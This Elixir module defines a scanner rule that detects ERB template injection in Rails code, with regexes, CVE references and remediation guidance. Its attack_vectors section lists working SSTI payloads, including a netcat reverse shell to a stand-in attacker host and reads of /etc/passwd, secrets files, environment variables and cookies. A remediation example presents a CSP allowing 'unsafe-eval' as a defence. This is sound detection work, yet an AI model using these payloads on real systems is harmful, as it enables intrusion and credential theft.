defmodule RsolvApi.Security.Patterns.Rails.ErbInjection do
  @moduledoc """
  ERB Template Injection pattern for Rails applications.
  
  This pattern detects Server-Side Template Injection (SSTI) vulnerabilities
  through ERB template evaluation with user input. This is one of the most
  critical vulnerabilities in Rails applications as it can lead to complete
  remote code execution on the server.
  
  ## Background
  
  ERB (Embedded Ruby) is the default templating engine in Rails. SSTI occurs when:
  - User input is directly passed to ERB.new() 
  - User input is used in render inline: calls
  - User input is interpolated into template names
  - ActionView::Template.new() is called with user data
  - Haml templates are created with user input
  
  ## Vulnerability Details
  
  The vulnerability occurs when:
  1. User input is directly evaluated as ERB template code
  2. Template names or sources are constructed with user input
  3. Render methods accept unvalidated user input
  4. Haml engines are initialized with user-controlled data
  
  ## Known CVEs
  
  - CVE-2016-2098: RCE via render inline in Rails (CVSS 9.8)
  - CVE-2020-8163: Code injection via locals parameter in render
  - CVE-2019-5418: File content disclosure via render file (related)
  - Multiple template injection incidents in Rails applications
  
  ## Examples
  
      # Critical - Direct ERB evaluation
      ERB.new(params[:template]).result
      
      # Critical - Render inline with user input  
      render inline: params[:template]
      
      # Critical - Template name interpolation
      render template: "\#{params[:view]}"
      
      # Safe - Static template with data binding
      render template: "users/show", locals: { data: params[:data] }
  """
  
  use RsolvApi.Security.Patterns.PatternBase
  
  def pattern do
    %RsolvApi.Security.Pattern{
      id: "rails-erb-injection",
      name: "ERB Template Injection",
      description: "Server-side template injection through ERB evaluation with user input",
      type: :template_injection,
      severity: :critical,
      languages: ["ruby"],
      frameworks: ["rails"],
      regex: [
        # ERB.new with user input (exclude comments)
        ~r/^(?!.*#.*ERB\.new).*ERB\.new\s*\(\s*params\[/,
        ~r/^(?!.*#.*ERB\.new).*ERB\.new\s*\(\s*request\.params\[/,
        ~r/^(?!.*#.*ERB\.new).*ERB\.new\s*\(\s*user_\w+/,
        ~r/^(?!.*#.*ERB\.new).*ERB\.new\s*\(\s*\w+_template/,
        ~r/ERB\.new\s*\(\s*["'`]<%= #\{params\[:code\]\}/,
        ~r/render\s+inline:\s*["'`]<%=.*?#\{.*?params.*?\}/,
        # ActionView::Template.new with user input
        ~r/ActionView::Template\.new\s*\(\s*params\[/,
        ~r/ActionView::Template\.new\s*\(\s*request\.params\[/,
        # render inline with user input
        ~r/render\s+inline:\s*params\[/,
        ~r/render\s+:inline\s*=>\s*\w*params\[/,
        ~r/render\s+inline:\s*user_\w+/,
        ~r/render\s+:inline\s*=>\s*user_\w+/,
        ~r/render\s+inline:\s*request\.params\[/,
        # render template with interpolated user input  
        ~r/render\s+template:\s*["'`][^"'`]*#\{[^}]*params[^}]*\}/,
        ~r/render\s+:template\s*=>\s*["'`][^"'`]*#\{[^}]*params[^}]*\}/,
        # render partial with user input
        ~r/render\s+partial:\s*params\[/,
        ~r/render\s+:partial\s*=>\s*params\[/,
        ~r/render\s+partial:\s*request\.params\[/,
        # render plain with erb template (less common but dangerous)
        ~r/render\s+plain:\s*erb_template/,
        # Haml template injection
        ~r/Haml::Engine\.new\s*\(\s*params\[/,
        ~r/Haml::Engine\.new\s*\(\s*user_\w+/,
        ~r/Haml\.render\s*\(\s*params\[/,
        ~r/Haml\.render\s*\(\s*user_\w+/,
        # Template content variables with user input
        ~r/template_content\s*=\s*params\[.*?ERB\.new\s*\(\s*template_content\)/
      ],
      default_tier: :ai,
      cwe_id: "CWE-94",
      owasp_category: "A03:2021",
      recommendation: "Never render user input as Rails ERB templates. Use static Rails templates with safe data binding and Rails helpers.",
      test_cases: %{
        vulnerable: [
          "ERB.new(params[:template]).result",
          "render inline: params[:template]",
          "render template: \"\#{params[:view]}\""
        ],
        safe: [
          "render template: \"fixed_template\", locals: { data: params[:data] }",
          "ERB.new(File.read(\"template.erb\")).result",
          "render partial: \"shared/header\""
        ]
      }
    }
  end
  
  def vulnerability_metadata do
    %{
      description: """
      Server-Side Template Injection (SSTI) in ERB templates is one of the most
      critical vulnerabilities in Rails applications. It occurs when user-controlled
      input is directly evaluated as template code, allowing attackers to execute
      arbitrary Ruby code on the server. ERB is Rails' default templating engine,
      making this vulnerability particularly dangerous in web applications.
      
      The vulnerability is especially severe because:
      1. ERB has full access to Ruby's capabilities and server environment
      2. Successful exploitation leads to complete server compromise
      3. It can bypass all application-level security controls
      4. Attackers can access files, databases, and execute system commands
      5. It's often overlooked during security reviews due to template complexity
      """,
      
      attack_vectors: """
      1. **Direct Code Execution via ERB**: <%= system('whoami') %>
      2. **File System Access**: <%= File.read('/etc/passwd') %>
      3. **Database Access**: <%= User.all.to_json %> 
      4. **Environment Variable Extraction**: <%= ENV.to_h %>
      5. **Reverse Shell**: <%= IO.popen('nc -e /bin/sh attacker.com 4444') %>
      6. **Process Enumeration**: <%= `ps aux` %>
      7. **Network Reconnaissance**: <%= `nmap -sn 192.168.1.0/24` %>
      8. **Privilege Escalation**: <%= `sudo -l` %> or <%= Process.uid %>
      9. **Application Source Code Disclosure**: <%= File.read(Rails.root.join('config/secrets.yml')) %>
      10. **Session Hijacking**: <%= session.to_h %> or <%= cookies.to_h %>
      """,
      
      business_impact: """
      - Complete server and application compromise via remote code execution
      - Full data breach exposing all customer and business data  
      - Financial losses from fraud and data theft
      - Regulatory fines for data protection violations (GDPR, CCPA, HIPAA)
      - Reputation damage and complete loss of customer trust
      - Business disruption from ransomware or data destruction
      - Legal liability from compromised user data and privacy violations
      - Competitive disadvantage from stolen intellectual property and trade secrets
      - Potential criminal charges if sensitive government or healthcare data is exposed
      """,
      
      technical_impact: """
      - Arbitrary code execution with application privileges
      - Complete file system access (read/write/execute)
      - Full database access and manipulation
      - Network reconnaissance and lateral movement capabilities
      - Access to environment variables and configuration secrets
      - Ability to install backdoors and persistent access mechanisms
      - Memory dumps and process manipulation
      - Ability to modify application code and behavior
      - Session and authentication bypass
      """,
      
      likelihood: "Medium-High - Template injection is less common than SQL injection but devastating when present",
      
      cve_examples: [
        "CVE-2016-2098 - Rails RCE via render inline affecting Rails < 3.2.22.2, 4.x < 4.1.14.2, 4.2.x < 4.2.5.2 (CVSS 9.8)",
        "CVE-2020-8163 - Rails code injection via locals parameter affecting Rails < 5.0.1 (CVSS 7.5)",
        "CVE-2019-5418 - Rails file content disclosure via render file (related template vulnerability)",
        "HackerOne Report #942103 - SSTI in Rails UJS test server leading to RCE",
        "Multiple undisclosed SSTI vulnerabilities in Rails applications reported via bug bounty programs"
      ],
      
      compliance_standards: [
        "OWASP Top 10 2021 - A03: Injection",
        "CWE-94: Code Injection", 
        "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code",
        "PCI DSS 6.5.1 - Injection flaws",
        "NIST SP 800-53 - SI-10 Information Input Validation",
        "ISO 27001 - A.14.2.5 Secure system engineering principles",
        "ASVS 4.0 - V5.3 Output Encoding and Injection Prevention"
      ],
      
      remediation_steps: """
      1. **Never Use User Input in Template Evaluation (Critical)**:
         ```ruby
         # NEVER do this - Critical vulnerability
         ERB.new(params[:template]).result        # DANGEROUS
         render inline: params[:template]         # DANGEROUS
         render template: "\#{params[:view]}"     # DANGEROUS
         
         # Always use static templates with data binding
         render template: "users/show", locals: { user_data: params[:data] }  # SAFE
         ```
      
      2. **Use Static Template Names Only**:
         ```ruby
         # Bad - dynamic template names
         render template: params[:template_name]  # VULNERABLE
         
         # Good - whitelist approach
         ALLOWED_TEMPLATES = %w[dashboard profile settings].freeze
         template_name = ALLOWED_TEMPLATES.include?(params[:template]) ? 
                        params[:template] : 'dashboard'
         render template: "users/\#{template_name}"  # SAFE
         ```
      
      3. **Secure Data Passing to Templates**:
         ```ruby
         # Pass data safely via locals
         render template: "users/show", locals: {
           user_name: sanitize(params[:name]),
           user_email: params[:email],
           data: safe_data_hash
         }
         ```
      
      4. **Input Validation and Sanitization**:
         ```ruby
         # If you must construct templates dynamically (strongly discouraged)
         def safe_template_name(input)
           # Strict whitelist validation
           allowed = %w[index show edit new]
           return 'index' unless allowed.include?(input)
           input
         end
         
         # Sanitize any dynamic content
         content = ActionController::Base.helpers.sanitize(params[:content])
         ```
      
      5. **Content Security Policy (Defense in Depth)**:
         ```ruby
         # In ApplicationController
         before_action :set_csp_header
         
         private
         
         def set_csp_header
           response.headers['Content-Security-Policy'] = 
             "default-src 'self'; script-src 'self' 'unsafe-eval'"
         end
         ```
      """,
      
      prevention_tips: """
      - Never pass user input directly to ERB.new(), render inline:, or template: with interpolation
      - Always use static template files with data passed via locals
      - Sanitize and validate all user input before using in templates
      - Implement strict whitelist validation for any dynamic template selection
      - Use Rails' built-in XSS protection and never call .html_safe on user input
      - Enable Rails' force_ssl in production to prevent MITM template injection
      - Implement Content Security Policy (CSP) headers as defense-in-depth
      - Use automated security scanning tools like Brakeman in CI/CD pipelines
      - Train developers on template injection risks and secure templating practices
      - Conduct regular penetration testing focusing on template injection vectors
      - Monitor application logs for suspicious template-related errors
      - Implement strict input validation at the controller level
      - Use Rails' strong parameters to control what data reaches templates
      """,
      
      detection_methods: """
      - Static analysis with Brakeman scanner (detects most ERB injection patterns)
      - Manual code review focusing on all render calls and ERB usage
      - Grep/ripgrep patterns: ERB\\.new.*params, render.*inline.*params, render.*template.*#\\{
      - Dynamic testing with SSTI payloads: <%= 7*7 %>, <%= "hello".upcase %> 
      - Web application security scanners (OWASP ZAP, Burp Suite)
      - Penetration testing with template injection fuzzing
      - Runtime application self-protection (RASP) solutions
      - Code analysis in CI/CD pipelines using tools like CodeQL
      - Security-focused linters and IDE plugins
      - Regular security audits and code reviews
      """,
      
      safe_alternatives: """
      # 1. Use static template names with data binding (Recommended)
      render template: "users/profile", locals: {
        user: current_user,
        data: sanitized_params,
        preferences: user_preferences
      }
      
      # 2. Predefined template selection with whitelist
      class TemplateSelector
        ALLOWED_TEMPLATES = {
          'dashboard' => 'admin/dashboard',
          'profile' => 'users/profile', 
          'settings' => 'users/settings'
        }.freeze
        
        def self.safe_template(template_key)
          ALLOWED_TEMPLATES[template_key] || 'errors/not_found'
        end
      end
      
      # Usage
      render template: TemplateSelector.safe_template(params[:view])
      
      # 3. Component-based approach
      class SafeComponentRenderer
        def self.render_user_card(user_data)
          # Predefined, safe template
          ApplicationController.renderer.render(
            partial: 'users/card',
            locals: { user: user_data }
          )
        end
      end
      
      # 4. Template builder pattern
      class SafeTemplateBuilder
        def initialize(base_template)
          @base_template = validate_template_name(base_template)
          @data = {}
        end
        
        def with_data(key, value)
          @data[key] = sanitize_value(value)
          self
        end
        
        def render
          ApplicationController.renderer.render(
            template: @base_template,
            locals: @data
          )
        end
        
        private
        
        def validate_template_name(template)
          # Strict validation logic
        end
        
        def sanitize_value(value)
          # Sanitization logic
        end
      end
      
      # 5. View objects pattern
      class UserProfileView
        def initialize(user, params)
          @user = user
          @safe_params = sanitize_params(params)
        end
        
        def render
          ApplicationController.renderer.render(
            template: 'users/profile',
            locals: { 
              user: @user, 
              data: @safe_params 
            }
          )
        end
        
        private
        
        def sanitize_params(params)
          # Comprehensive sanitization
        end
      end
      """
    }
  end
  
  def ast_enhancement do
    %{
      min_confidence: 0.95,
      
      context_rules: %{
        # Template engines that can be dangerous
        template_engines: [
          "ERB", "Haml", "ActionView::Template", "Slim", "Liquid"
        ],
        
        # Common sources of user input
        user_input_sources: [
          "params", "request", "cookies", "session",
          "query_params", "form_params", "user_input", "user_template"
        ],
        
        # Dangerous template methods
        dangerous_patterns: [
          "ERB.new", "render inline:", "render template:", "render partial:",
          "Haml::Engine.new", "Haml.render", "ActionView::Template.new"
        ],
        
        # Safe patterns to reduce false positives
        safe_patterns: [
          ~r/render\s+template:\s*["'`]\w+["'`]/,  # Static template names
          ~r/render\s+partial:\s*["'`][\w\/]+["'`]/,  # Static partial names
          ~r/ERB\.new\s*\(\s*File\.read/,  # File-based templates
          ~r/locals:\s*\{/,  # Using locals for data
          ~r/\.html_safe\s*$/  # Explicit html_safe calls
        ]
      },
      
      confidence_rules: %{
        adjustments: %{
          # Very high confidence for direct user input in template methods
          user_input_in_template: +0.5,
          # High confidence for render inline usage
          render_inline_usage: +0.4,
          # High confidence for ERB.new with params
          erb_new_with_params: +0.4,
          # Medium confidence for any template interpolation
          template_interpolation: +0.3,
          # Lower if using locals (safer pattern)
          uses_locals: -0.2,
          # Much lower if in test files
          in_test_file: -0.6,
          # Lower if static template detected
          static_template_pattern: -0.4,
          # Higher for ActionView::Template usage
          actionview_template_usage: +0.3,
          # Higher for Haml engine usage
          haml_engine_usage: +0.3
        }
      },
      
      ast_rules: %{
        # Template method analysis
        template_analysis: %{
          check_method_calls: true,
          template_methods: [
            "render", "ERB.new", "Haml::Engine.new", "ActionView::Template.new"
          ],
          dangerous_options: ["inline", "template", "partial"],
          trace_variable_flow: true
        },
        
        # String interpolation detection  
        interpolation_detection: %{
          patterns: ["StringInterpolation", "StringConcat"],
          check_for_user_input: true,
          template_context: true
        },
        
        # Method call context analysis
        method_analysis: %{
          check_receiver: true,
          check_arguments: true,
          check_options_hash: true,
          trace_user_input: true
        },
        
        # Template safety patterns
        safety_patterns: %{
          file_based_templates: ~r/File\.read|File\.open/,
          static_templates: ~r/render.*["'`]\w+["'`]/,
          locals_usage: ~r/locals:\s*\{/,
          sanitization_methods: ["sanitize", "html_escape", "strip_tags"]
        }
      }
    }
  end
  
end

